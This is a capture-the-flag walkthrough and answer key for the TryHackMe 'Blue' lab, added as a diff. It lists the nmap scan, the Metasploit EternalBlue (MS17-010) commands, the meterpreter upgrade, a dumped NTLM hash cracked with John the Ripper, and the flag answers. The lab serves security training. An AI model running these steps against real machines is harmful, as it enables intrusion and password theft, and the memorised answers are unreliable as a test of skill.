@@ -1,0 +1,132 @@
+#### Link to room: https://tryhackme.com/room/blue
+
+#### [Task 1] Recon
+   1. No answer needed
+> Hint:
+>
+> Type the following command into terminal: 
+>
+> nmap -sC -sV \<GIVEN-IP-ADDRESS\>
+>
+> The output should look something like this: 
+```
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+|_ssl-date: 2020-05-09T14:44:17+00:00; -8s from scanner time.
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+```
+   2. 3
+> Hint: 
+>
+> Look at the port numbers and count the number that are below 1000 
+   3. MS17-010
+> Hint
+>
+> From the output you can see the version "Windows 7 Professional 7601"
+>
+> If you search on google for "Windows 7 Professional 7601 exploit", you will see the code for this vulnerability
+
+#### [Task 2] Gain Access
+   1. No answer needed
+   2. exploit/windows/smb/ms17_010_eternalblue
+> Hint: 
+>
+> If you type "search ms17" into the metasploit (msf5 >) console
+>
+> Look for the output that is an exploit - starts with exploit/ 
+   3. RHOSTS
+> Hint: 
+>
+> Type the following command into the metasploit console: 
+>
+> use exploit/windows/smb/ms17_010_eternalblue
+>
+> Then type "show options"
+>
+> If we were then to type "run"
+>
+> Then we get an error like "Exploit failed: The following options failed to validate: RHOSTS."
+>
+> Then type "set RHOSTS \<GIVEN-IP-ADDRESS\>"
+   4. No answer needed
+   5. No answer needed
+
+
+#### [Task 3] Escalate
+   1. post/multi/manage/shell_to_meterpreter
+> Hint: 
+>
+> If you search on google you should be able to find something that details "shell_to_meterpreter"
+   2. SESSION 
+> Hint: 
+>
+> If you type the commnad "use post/multi/manage/shell_to_meterpreter"
+>
+> Then type "show options", you should see a blank space next to the word "SESSION"
+   3. No answer needed
+> Hint:
+>
+> Type the command "sessions -l"
+>
+> Whichever ID number is next to the "x64/windows", use that number
+>
+> Type the command "set session \<ID-NUMBER\>"
+   4. No answer needed 
+   5. No answer needed 
+> Hint: 
+>
+> Show all the sessions with the commnand "sessions -l"
+>
+> You should be able to see something like "meterpreter x86/windows"
+>
+> Type "sessions \<ID-NUMBER\>"
+   6. No answer needed 
+   7. No answer needed 
+   8. No answer needed 
+
+#### [Task 4] Cracking
+   1. Jon
+   2. alqfna22
+> Hint: 
+>
+> The hash is "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::"
+>
+> In the terminal if you type "echo Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: > hash.txt" 
+>
+> You will have a text file that contains the hash
+>
+> After entering the hash into this (website)[https://www.tunnelsup.com/hash-analyzer/], we see it might be NTLM.
+>
+> If you type the following command into terminal: 
+>
+> john --list=formats
+>
+> You should be able to see all the formats of hashes that the tool John the ripper will be able to crack
+>
+> If you type the following command into terminal: 
+>
+> john hash.txt --format=NT -wordlist=/usr/share/wordlists/rockyou.txt
+
+
+#### [Task 5] Find flags! 
+   1. {access_the_machine}
+> Hint: 
+>
+> In the meterpreter shell, if you type "cd .." till you are back into the C:\ directory 
+>
+> Then you should be able to see the flag1.txt
+   2. {sam_database_elevated_access} 
+> Hint: 
+>
+> Found in this directory "C:\Windows\System32\config"
+   3. {admin_documents_can_be_valuable}
+> Hint: 
+>
+> Found in this directory "C:\Users\Jon\Documents"
